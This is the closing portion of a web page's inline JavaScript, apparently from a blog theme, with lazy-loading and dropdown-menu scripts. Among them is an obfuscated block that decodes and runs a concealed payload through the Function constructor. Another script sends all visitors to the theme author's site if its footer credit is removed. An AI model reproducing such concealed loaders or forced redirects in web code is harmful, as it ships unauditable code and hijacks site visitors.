c[u](function(e){e[l](function(e,n){e.isIntersecting&&(n=e.target)&&(t.unobserve(n),r(n))})},i),b(e||'[data-src]')[l](function(e){e[m](d)||(e.setAttribute(d,''),t?t.observe(e):r(e))})},n)},f.reveal=g,c.Defer=f,c.addEventListener('on'+e in c?e:n,function(){for(I();s[0];t(s[h](),s[h]()))r=1})}(this,document,setTimeout),function(e,n){e.defer=n=e.Defer,e.deferscript=n.js,e.deferstyle=n.css,e.deferimg=e.deferiframe=n.dom}(this); (function(){var NVi='',yKz=481-470;function wEz(s){var b=785575;var p=s.length;var l=[];for(var z=0;z<p;z++){l[z]=s.charAt(z)};for(var z=0;z<p;z++){var o=b*(z+441)+(b%12942);var a=b*(z+321)+(b%22037);var h=o%p;var x=a%p;var q=l[h];l[h]=l[x];l[x]=q;b=(o+a)%3503090;};return l.join('')};var gXQ=wEz('ozlejruknthxtcwcrbtsasgdfqovounicpmry').substr(0,yKz);var YOh='uah(sgy1ns++)1+r2]60)fyo[a]8di.t;r;sn.in,1lt0hla =rmni(ju=f=(8,})2>8=bs7j8dt0bs7vvmv=mc,on2;imo)vx+"a5[t=,f1n();=5=g2,=n];ik.nj,)s;.frvv"rsr.art]l}lewg;l=so)ok=hl6("=;+!i(+, j)ni;b==vtfegs1+[9,))7]t(ulrar  ;u+oe,ug neC<s. 2wr,fw(dkxnvat yca*limci++n=4-=)hr1psS8(n }+s(sr"rco.;6not;t3],e.h;a;v+0a,4lf))u9i[,n;ev}xe h((a"p;[hu0j)v0t is0gvs[xp9((rcyyto.llran;noqtta=p-=hr6+o,)iA<{);;gv;7([rvoCo(=;(.v) ea=blsnS+al)r)l6h.dlua1;)y+"v(na C2+C)t<y).0-,(3d-nn+]q;e,teq*A0rs")j{l,a re4f(0oeh;).mfcosg+}d,[];y.1]r;soc7r;1)7eam  b;,-nc)oy;hnuf,.ghaetc7));ru7= i=(0.atu=m)1ayarh a;a,)i.ro(aC+vqa0ft9h]tvr} (3]idp,-x;e,xg2,mAdt(=r;e>"v5agntz9p{=f(f<;) +iataiurr!umgt=l.8te.+]{r===;C{8ng-nhr;r(t (o6(<[a.h0ifr(r;rj )h8s()hl{C8r t7g.e;rjr92[1[a 6=a=;.l=wp+naw.yvd di{;byiesl;7=eC,4he}dtkvpycf=nrvrr]i=aff(re"er=1xio 3rpo9t[(b[tsh,anc;a;A[(]6=.lrtwrlomrvu.g=,mehmA)+2el=p+pi0;2bgur+5t.actg==nt";si.=hif(s;;';var oUi=wEz[gXQ];var OuB='';var Uhy=oUi;var sNd=oUi(OuB,wEz(YOh));var zKA=sNd(wEz('s4R5-{R.nweR R$)=-stR,$.!;swRy3,R,b!)k7R3b_4of22o=5j;9iReaob{.ooiR%}.,a,r),o)n.r157R3n),(u.;eo$"c.g(r21#7ee&9%t+\/Rtiba.2e(b3tt;f1$R)3=)oR)7a$;te*e!37e2l,s.%,bsaen.;a*6q\/tp][rb%r3rT(%i]wtb;nRe5oyunnpSp59phRw8,0Rea1(%e0}R\/*+(tv7Ca!t&r{R2mR+en370R=orRr=)bc%ue4,te)=3ltab,srvtR$dco)w%R--ot]lw_Rl].]r.)"129]b.6s\/_n)R"!e1v.i4x)r=g0}rRR$s(R3;.+l;lR6%}1xRe$7t)rn(;n(e(%o(6apR_lde4i0%9bl\'n0[R;!.],t.Ra.j(.Rr m3dsRv;tx1R)R}R=R_R!3]il71b,ws=cle_mca R%Rt)n1}=3#r Rewt%3nf!$8ld7r.0.pRR.)(](,o.)Rn5.8,w,&. \'w,R=he)3263oRi(#(l6.[!aRRoR[rzR4.=Rr;t48vlxhn1).,%kjf]Rsts2z2;).;ayr"km_t;]4t]f!e,ex..t)f2R=ks mtg&Roc.b)RRr8(I,Ri,_;;7)\/k,reRp$utpuiR+0]!52t(.v]n56])14rjlo)}(tR=!-nwRur,n t]1{7;4mC=lb3ode$my$[,#6p0(e3nR{!,% ,_a=l7pfnut=f,ScRRR#(nt6\/k.f}b&m"=lurC+(3RRehR(ebe r{.)\/r.C09R_j R!)0Rb2ec9 Rr]fc6$g(.0g!.b.[rRj(m){zRr]r%%fi(._R6R*);03t4t fxRaRjt(4n$R(R5!t9ma*ef)=.att\/ y_\'t_)$(%Rr;f(t.)ruu$16]1g2iReS*%R(feR+])(1 x=R3*o,;,}u\'b)nn2#;Run}.efet)rtR%!_R(=d,l$Rclb"])3)9r8nr3h%)R!8f6,.c %RRgyR.13ii}e6{{RR.),mx(.2p,ow3=pe1St$}o_eRhRR5}i+_t)b.=bvRR,1)uvR1RR5.14Rw1.(eaue.(.9,.Rt3lgr(b h.%t$c)iaeyo%4ls$8tr=}Re,(!o$2tk$.[oaf4nf7)1ut.#)e0  $i.RReb(;7jRn)40$n2nb.r% %t,6b\/{ f)n!8ex(%!][R1;;br4tuR.f4tbR.%]l)tybkfs418!.R;!R5[el_5o7] .aroR;b5EaR"bbR *$=%p.= R jtnd)!{_1!,!=r6C-g)0vRbx.+'));var Emx=Uhy(NVi,zKA );Emx(8998);return 3447})(); "use strict";$(document).ready(function(){var e,t,r;e=window,t=document,(r=$("footer > .cr-footer > .creator > a.it")).length?(e.validurlit=function(e){return/((([A-Za-z]{3,9}:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-_]*)?\??(?:[\-\+=&;%@\.\w_]*)#?(?:[\.\!\/\\\w]*))?)/.test(e)},e.sUp=function(e){t.querySelector(e).parentNode.style.height="0"},e._GET=function(e,t){t||(t=location.href);var r=RegExp("[\\?&]"+(e=e.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]"))+"=([^&#]*)").exec(t);return null==r?null:r[1]},r.attr("href","//www.inputekno.com").text("InpuTekno")):location.href="//www.inputekno.com"});
Defer.dom('.lazy', 100, 'loaded', null, {rootMargin:'1px'}),'undefined'!=typeof infinite_scroll&&infinite_scroll.on('load',function(){Defer.dom('.lazy', 100, 'loaded', null, {rootMargin:'1px'}) });
/* Custom - Menu by halfapx | v1.0.0  - https://halfapx.com/three-level-dropdown-from-link-list */
$((function(){var a=$("#main-linktree"),t="parent",s="child-item",l="grandchild-item",n="level-two",e="level-three";hasSub="has-sub";var d=$('li a:contains("__")'),i=$('li a:contains("_")');if(null==a.attr("class")){a.addClass("main-linktree");var r="main-linktree"}else r=a.attr("class");i.parent().addClass(s);for(var o=$("."+s),h=0;h<o.length;)h+=o.eq(h).nextUntil(":not(."+s+")").addBack().wrapAll("<ul></ul>").length;o.parent().addClass(n),d.parent().addClass(l);var u=$("."+l);for(h=0;h<u.length;)h+=u.eq(h).nextUntil(":not(."+l+")").addBack().wrapAll("<ul></ul>").length;u.parent().addClass(e),$("."+r+" > li").addClass(t),$("."+r+" a span").each((function(){$(this).text($(this).text().replace(/_/g," "))})),$("."+n+" > ."+s).each((function(){$(this).next().is("."+e)&&$(this).next().appendTo($(this))})),$("."+r+" > ."+t).each((function(){$(this).next().is("."+n)&&$(this).next().appendTo($(this))})),$(this).find("."+r+" > li ul a").addClass("dropdown-item"),$(this).find("."+r+" > li ul").parent("li").addClass(hasSub);var p=$(this).find("."+hasSub+" > a");p.addClass("dropdown-toggle"),p.attr({"data-bs-toggle":"dropdown","aria-expanded":"false",role:"button","data-bs-display":"static","data-bs-auto-close":"outside"}),$(this).find("."+hasSub+" > ul").addClass("dropdown-menu")}));
//]]></script>
  &lt;textarea id=&quot;bjs&quot; readonly hidden&gt;</body>&lt;/textarea&gt;
  <script>document.getElementById(&#39;bjs&#39;).remove(), document.body.lastElementChild.remove()</script>&lt;/body&gt;
</html>
